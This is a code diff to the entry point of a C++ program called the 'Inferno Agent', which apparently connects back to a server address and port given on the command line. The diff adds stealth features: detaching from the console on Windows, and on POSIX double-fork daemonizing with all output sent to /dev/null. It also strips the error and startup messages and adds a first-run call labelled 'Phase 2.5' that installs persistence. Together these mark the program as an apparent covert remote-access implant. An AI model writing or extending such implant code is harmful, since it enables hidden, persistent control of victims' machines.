@@ -2,7 +2,65 @@
 #include "../../common/include/CryptoContext.hpp"
 #include <iostream>
 
+#ifdef _WIN32
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/stat.h>
+#endif
+
+namespace {
+
+void daemonize() {
+#ifdef INFERNO_TESTING
+    return; // Keep console visible in test builds
+#endif
+
+#ifdef _WIN32
+    // Detach from the parent console. If the binary is compiled with
+    // /SUBSYSTEM:WINDOWS (CMake: WIN32_EXECUTABLE), no console is created
+    // at all. This call handles the case where it's run from a console.
+    if (FreeConsole()) {
+        // Successfully detached
+    }
+#else
+    // Double-fork daemonization (POSIX)
+    pid_t pid = ::fork();
+    if (pid < 0) {
+        return; // fork failed — continue anyway
+    }
+    if (pid > 0) {
+        ::exit(0); // Parent exits — child continues
+    }
+
+    // First child: create new session, detach from terminal
+    ::setsid();
+    ::umask(0);
+
+    // Second fork — grandchild becomes the actual agent
+    pid = ::fork();
+    if (pid < 0) {
+        return;
+    }
+    if (pid > 0) {
+        ::exit(0); // First child exits — grandchild continues
+    }
+
+    // Grandchild: redirect stdio to /dev/null
+    (void)::freopen("/dev/null", "r", stdin);
+    (void)::freopen("/dev/null", "w", stdout);
+    (void)::freopen("/dev/null", "w", stderr);
+#endif
+}
+
+} // anonymous namespace
+
 int main(int argc, char* argv[]) {
+    daemonize();
+
     std::string ip = "127.0.0.1";
     uint16_t port = 8080;
 
@@ -16,14 +74,16 @@ int main(int argc, char* argv[]) {
             }
             port = static_cast<uint16_t>(p);
         } catch (...) {
-            std::cerr << "[Error] Invalid port: " << argv[2] << ". Must be 1-65535.\n";
-            std::cerr << "Usage: " << argv[0] << " <server_ip> <server_port>\n";
             return 1;
         }
     }
 
     inferno::CryptoContext::instance().initDefault();
-    std::cout << "[Inferno Agent] Initializing Deployment to " << ip << ":" << port << "...\n";
+
+    // Install persistence on first run (Phase 2.5)
+    if (argc > 0 && argv[0]) {
+        inferno::Agent::installPersistence(argv[0]);
+    }
     
     inferno::Agent agent(ip, port);
     agent.run();
